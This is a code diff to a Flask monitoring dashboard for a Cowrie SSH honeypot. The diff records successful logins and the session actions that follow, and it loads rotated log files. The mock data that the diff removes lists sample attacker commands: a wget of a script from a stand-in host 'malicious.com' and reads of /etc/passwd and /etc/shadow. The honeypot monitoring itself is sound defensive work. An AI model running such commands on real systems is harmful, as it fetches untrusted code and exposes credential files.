@@ -18,9 +18,11 @@ import signal
 import sys
 import time
 import threading
-from collections import deque
+from collections import deque, defaultdict
 from datetime import datetime
 from typing import Dict, Any, Optional
+import gzip
+import glob
 
 from flask import Flask, render_template, jsonify, request, Response
 from flask_socketio import SocketIO, emit
@@ -364,8 +366,15 @@ class CowrieMonitor:
             'map_data': {
                 'markers': deque(maxlen=cfg.MAX_MAP_MARKERS),
                 'heatpoints': deque(maxlen=cfg.MAX_MAP_MARKERS)
-            }
+            },
+            'alerts': deque(maxlen=cfg.MAX_ALERTS)
         }
+        
+        # Store all successful logins (last 2000)
+        self.successful_logins = deque(maxlen=2000)
+        
+        # Track successful login sessions for action collection
+        self.successful_sessions = {}  # session -> login_data
 
         self.alerts: deque = deque(maxlen=cfg.MAX_ALERTS)
         self._alerted_ips: BoundedSet = BoundedSet(max_size=10000)
@@ -408,6 +417,23 @@ class CowrieMonitor:
 
         if is_success:
             self.stats['successful_logins'] += 1
+            # Store successful login details
+            login_data = {
+                'timestamp': timestamp,
+                'ip': ip,
+                'username': username,
+                'password': password,
+                'country': country,
+                'organization': organization,
+                'latitude': latitude,
+                'longitude': longitude,
+                'session': session,
+                'type': 'cowrie.login.success',
+                'actions': []
+            }
+            self.successful_logins.append(login_data)
+            # Track the session for action collection
+            self.successful_sessions[session] = login_data
             event_type = 'login.success'
         else:
             self.stats['failed_logins'] += 1
@@ -637,6 +663,15 @@ class CowrieMonitor:
                 self._enrich_queue.put_nowait(entry)
             except queue.Full:
                 pass
+        
+        # Collect actions for successful login sessions
+        if eventid.startswith('cowrie.') and eventid != 'cowrie.login.success' and session in self.successful_sessions:
+            action = {
+                'type': eventid.replace('cowrie.', '').replace('.', '_'),
+                'timestamp': entry.get('timestamp', ''),
+                'details': {k: v for k, v in entry.items() if k not in ['timestamp', 'session', 'src_ip', 'eventid']}
+            }
+            self.successful_sessions[session]['actions'].append(action)
 
     def _detect_log_rotation(self) -> bool:
         """Detect if log file was rotated (truncated or replaced)."""
@@ -670,23 +705,53 @@ class CowrieMonitor:
         logger.info("Started monitoring: %s", self.log_path)
         file_handle = None
 
-        # Load historical data first
+        # Load historical data from all log files
         if os.path.exists(self.log_path):
-            logger.info("Loading historical data from log file...")
-            try:
-                with open(self.log_path, 'r', encoding='utf-8', errors='replace') as hist_file:
-                    for line_num, line in enumerate(hist_file, 1):
-                        if not line.strip():
-                            continue
-                        entry = self.parse_log_entry(line)
-                        if entry:
-                            self.update_stats(entry)
-                        # Log progress every 100 lines
-                        if line_num % 100 == 0:
-                            logger.info("Loaded %d historical entries...", line_num)
-                logger.info("Historical data loading completed")
-            except Exception as e:
-                logger.error("Error loading historical data: %s", e)
+            logger.info("Loading historical data from all log files...")
+            log_dir = os.path.dirname(self.log_path)
+            base_name = os.path.basename(self.log_path)
+            
+            # Find all log files (current and rotated)
+            pattern = os.path.join(log_dir, base_name + '*')
+            log_files = glob.glob(pattern)
+            
+            # Sort by modification time (oldest first)
+            log_files.sort(key=lambda x: os.path.getmtime(x))
+            
+            logger.info("Found %d log files to process", len(log_files))
+            
+            total_loaded = 0
+            for log_file in log_files:
+                logger.info("Processing log file: %s", log_file)
+                try:
+                    if log_file.endswith('.gz'):
+                        with gzip.open(log_file, 'rt', encoding='utf-8', errors='replace') as f:
+                            for line_num, line in enumerate(f, 1):
+                                if not line.strip():
+                                    continue
+                                entry = self.parse_log_entry(line)
+                                if entry:
+                                    self.process_log_entry(entry)
+                                if line_num % 1000 == 0:
+                                    logger.info("Loaded %d entries from %s...", line_num, os.path.basename(log_file))
+                    else:
+                        with open(log_file, 'r', encoding='utf-8', errors='replace') as f:
+                            for line_num, line in enumerate(f, 1):
+                                if not line.strip():
+                                    continue
+                                entry = self.parse_log_entry(line)
+                                if entry:
+                                    self.process_log_entry(entry)
+                                if line_num % 1000 == 0:
+                                    logger.info("Loaded %d entries from %s...", line_num, os.path.basename(log_file))
+                    
+                    logger.info("Completed processing %s", log_file)
+                    total_loaded += 1
+                    
+                except Exception as e:
+                    logger.error("Error processing log file %s: %s", log_file, e)
+            
+            logger.info("Historical data loading completed from %d files", total_loaded)
 
         while self.running:
             try:
@@ -769,7 +834,7 @@ class CowrieMonitor:
                 'top_countries': self.stats['countries'].get_top(500),
                 'top_organizations': self.stats['organizations'].get_top(500),
                 'top_asns': self.stats['asns'].get_top(500),
-                'recent_attacks': sorted(list(self.stats['recent_attacks'])[-20:], key=lambda x: x.get('timestamp', ''), reverse=True)[:20],
+                'recent_attacks': sorted(list(self.stats['recent_attacks'])[-cfg.MAX_RECENT_ATTACKS:], key=lambda x: x.get('timestamp', ''), reverse=True)[:cfg.MAX_RECENT_ATTACKS],
                 'map_data': {
                     'markers': list(self.stats['map_data']['markers']),
                     'heatpoints': list(self.stats['map_data']['heatpoints'])
@@ -1143,58 +1208,18 @@ def health_check():
 @requires_auth
 @rate_limited
 def get_successful_logins():
-    """Get successful login details with actions."""
-    # For now, return mock data for testing
-    # In production this would query a database
-    
-    # Mock successful login data for demonstration
-    mock_successful_logins = [
-        {
-            'timestamp': '2026-02-26T02:45:00.000000Z',
-            'ip': '183.81.33.183',
-            'country': 'Vietnam',
-            'username': 'admin',
-            'password': '123456',
-            'actions': [
-                {
-                    'type': 'command',
-                    'command': 'ls -la',
-                    'timestamp': '2026-02-26T02:45:15.000000Z'
-                },
-                {
-                    'type': 'file_access',
-                    'path': '/etc/passwd',
-                    'timestamp': '2026-02-26T02:45:30.000000Z'
-                },
-                {
-                    'type': 'command',
-                    'command': 'wget http://malicious.com/script.sh',
-                    'timestamp': '2026-02-26T02:45:45.000000Z'
-                }
-            ]
-        },
-        {
-            'timestamp': '2026-02-26T02:30:00.000000Z',
-            'ip': '192.168.1.100',
-            'country': 'Local Network',
-            'username': 'root',
-            'password': 'password',
-            'actions': [
-                {
-                    'type': 'command',
-                    'command': 'whoami',
-                    'timestamp': '2026-02-26T02:30:10.000000Z'
-                },
-                {
-                    'type': 'command',
-                    'command': 'cat /etc/shadow',
-                    'timestamp': '2026-02-26T02:30:25.000000Z'
-                }
-            ]
-        }
-    ]
-    
-    return jsonify(mock_successful_logins)
+    """Get successful login attempts."""
+    try:
+        if hasattr(monitor, 'successful_logins'):
+            successful_logins = list(monitor.successful_logins)
+            # Return last 1000 successful logins
+            start_idx = max(0, len(successful_logins) - 1000)
+            return jsonify(successful_logins[start_idx:])
+        else:
+            return jsonify([])
+    except Exception as e:
+        logger.error(f"Error getting successful logins: {e}")
+        return jsonify({'error': str(e)}), 500
 
 
 # --- WebSocket Handlers ---
